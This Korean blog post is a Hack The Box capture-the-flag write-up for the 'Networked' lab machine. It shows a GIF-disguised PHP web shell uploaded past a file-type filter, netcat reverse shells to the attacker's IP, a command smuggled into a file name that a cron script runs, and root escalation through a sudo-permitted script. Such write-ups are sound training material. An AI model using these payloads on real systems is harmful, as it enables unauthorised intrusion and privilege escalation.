---
layout: article
title: "Hack The Box: Networked write-up"
excerpt: "Hack The Box: Networked write-up"
date: 2019-09-24 18:23:00 +0900
author: SystemaHacker
categories: [Write-up]
tags: [HackTheBox, Pen-Testing, Write-Up]
permalink: /writeup/networked
---

## 개요

![Hack The Box Networked card info](/assets{{ page.permalink }}/networked.png)

|OS|Linux|
|Difficulty|Easy|
|Points|20|
|Release|24 Aug 2019|
|IP Address|10.10.10.146|

---
## 조사
주어진 아이피 주소를 이용하여 nmap 스캔을 진행하였다.   

```
attacker$ nmap -A -v -sV --script vuln 10.10.10.146
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-enum:
|   /backup/: Backup folder w/ directory listing
|   /icons/: Potentially interesting folder w/ directory listing
|_  /uploads/: Potentially interesting folder w/ directory listing
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
443/tcp closed https
Nmap done: 1 IP address (1 host up) scanned in 63.85 seconds
```

포트 스캔 결과 22번 포트에서 ssh서버, 80번 포트에서 아파치 웹 서버를 발견하였다.
웹 서버에서 디렉터리들이 발견되었다.

- /backup/
- /icons/
- /uploads/

---
## 취약점 조사
[http://10.10.10.146/backup](http://10.10.10.146/backup) 주소로 접속 해보니 백업 압축 파일을 발견하였다.   
압축 해제 후 나온 PHP 코드를 분석 하였다.   

```
-rw-r--r--  1 attacker attacker  229 Jul  9 20:33 index.php
-rw-r--r--  1 attacker attacker 2001 Jul  2 20:38 lib.php
-rw-r--r--  1 attacker attacker 1871 Jul  2 21:53 photos.php
-rw-r--r--  1 attacker attacker 1331 Jul  2 21:45 upload.php
```

소스코드 분석 결과 [upload.php](/assets{{ page.permalink }}/upload.php)에서 업로드 할 파일 종류를 검증하는 코드에 취약점이 있음을 확인할 수 있다.

---
## PHP 웹쉘 업로드 
[upload.php](/assets{{ page.permalink }}/upload.php) 파일 분석 후 예상되는 이미지 업로드 취약점을 토대로 PHP 웹쉘을 작성하였다.   
코드 이전에 `GIF89a?` 를 입력함으로써 [이것이 이미지 파일이라고 인식시켜 악성코드를 업로드](https://asec.ahnlab.com/ko/18127/)할 것이다.  

[phpshell.php](/assets{{ page.permalink }}/phpshell.php)
```
GIF89a?
<?php
system( $_GET[cmd] );
?>
```

이제 파일 확장자를 `.gif`로 변경한 후 업로드한다.

---
## 웹 권한 탈취
<!--
업로드 페이지에서 이미지를 업로드 하는 모습.   
[http://10.10.10.146/upload.php](http://10.10.10.146/upload.php)
![업로드 페이지에서 이미지를 업로드 하는 모습.](/assets{{ page.permalink }}/1.png)   

업로드 페이지에서 업로드 완료 메시지가 뜬 모습.   
![업로드 페이지에서 업로드 완료 메시지가 뜬 모습.](/assets{{ page.permalink }}/2.png)   

갤러리 페이지에서 악성코드가 업로드된 것을 확인하는 모습.   
[http://10.10.10.146/photos.php](http://10.10.10.146/photos.php)
![갤러리 페이지에서 악성코드가 업로드된 것을 확인하는 모습.](/assets{{ page.permalink }}/3.png)   
-->

[http://10.10.10.146/upload.php](http://10.10.10.146/upload.php) 페이지에서 PHP 웹쉘을 업로드하는데 성공하였다.   

```
attacker$ nc -lvp 2021
```

웹 권한의 쉘을 탈취하기 위해 공격자의 PC에서 nc를 이용하여 2021 포트를 열었다.   
PHP 웹쉘이 업로드 된 URL에 GET 요청으로 cmd 파라미터에 Reverse Shell을 연결하는 명령을 전달한다. 

```
http://10.10.10.146/uploads/10_10_12_226.gif?cmd=nc 10.10.12.226 2021 -c bash
```
   
```
Connection from 10.10.10.146:41584
```

공격자 PC에 Reverse Shell이 연결된것을 확인할 수 있다.   

```
apache$ whoami
apache
```

apache 권한의 쉘을 탈취하였다.   

---
## guly 권한 상승
guly 권한을 탈취하기 위해 /home/guly 디렉토리를 살펴보자.   
```
apache$ ls -al /home/guly
-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
-r--------. 1 guly guly  33 Oct 30  2018 user.txt
```

[check_attack.php](/assets{{ page.permalink }}/check_attack.php), [crontab.guly](/assets{{ page.permalink }}/crontab.guly) 파일을 추가로 발견하였다.

[crontab.guly](/assets{{ page.permalink }}/crontab.guly) Crontab을 이용하여 매 3분마다 [check_attack.php](/assets{{ page.permalink }}/check_attack.php)를 실행시키는 듯 하다.   

[check_attack.php](/assets{{ page.permalink }}/check_attack.php) 파일을 확인 시 Uploads 디렉터리에서 파일 이름을 조금만 손보면 권한 상승이 가능할것 같다.   


/var/www/html/uploads/ 디렉토리에 `;`를 포함한 이름의 파일을 생성하면 원하는 명령을 실행할 수 있다.   

```
echo "" > ./";nc 10.10.12.226 2022 -c bash"
```

파일 이름이 잘 설정 되었는지 확인해보자.   
```
apache$ ls -al
drwxrwxrwx. 2 root   root     266 Sep 13 06:38 .
drwxr-xr-x. 4 root   root     103 Jul  9 13:30 ..
-rw-r--r--  1 apache apache    40 Sep 13 06:26 10_10_12_226.php.gif
-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_1.png
-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_2.png
-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_3.png
-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_4.png
-rw-r--r--  1 apache apache     1 Sep 13 06:38 ;nc 10.10.12.226 2022 -c bash
-r--r--r--. 1 root   root       2 Oct 30  2018 index.html
```
2022번 포트로 리스닝 nc를 열어놓으면 guly 유저 권한으로 상승 가능할것이다.   
다음 Crontab 스크립트가 돌아올 3분동안 기다리자.   

```
Connection from 10.10.10.146:36230
```

예상대로 3분 안에 공격자 PC의 2022 포트로 연결이 들어왔다.   
```
guly$ whoami
guly
```

guly 유저 권한을 탈취하였다.   

User flag 확인   
```
guly$ cat user.txt
```

---
## Root 권한 상승
root 권한을 탈취하기 위해서 권한 상승에 도움을 줄만한 파일들을 탐색해보았다.   
```
guly$ sudo -l
Matching Defaults entries for guly on networked:
User guly may run the following commands on networked:
(root) NOPASSWD: /usr/local/sbin/changename.sh
```
비밀번호 없이 실행할 수 있는 root 권한 파일을 발견하였다.    

[changename.sh](/assets{{ page.permalink }}/changename.sh)
```
guly$ ls -al /usr/local/sbin/changename.sh
-rwxr-xr-x 1 root root 422 Jul  8 12:34 /usr/local/sbin/changename.sh
```

/usr/local/sbin/changename.sh 파일을 이용하면 root 권한을 탈취 할 수 있을것이다.   

```
guly$ cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp=&quot;^[a-zA-Z0-9_\ /-]+$&quot;

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo &quot;interface $var:&quot;
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo &quot;wrong input, try again&quot;
		echo &quot;interface $var:&quot;
		read x
	done
	echo $var=$x &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-guly
done

/sbin/ifup guly0
```

입력된 값이 검증되지 않고 실행되는 취약점을 이용해 root 권한으로 bash shell을 실행 할 수 있다.   
```
guly$ sudo /usr/local/sbin/changename.sh
interface NAME:
asd /bin/bash
interface PROXY_METHOD:
asd
interface BROWSER_ONLY:
asd
interface BOOTPROTO:
asd
```

```
root$ whoami
root
```

root 권한을 탈취하였다.   
Root flag 확인   
```
root$ cat /root/root.txt
```
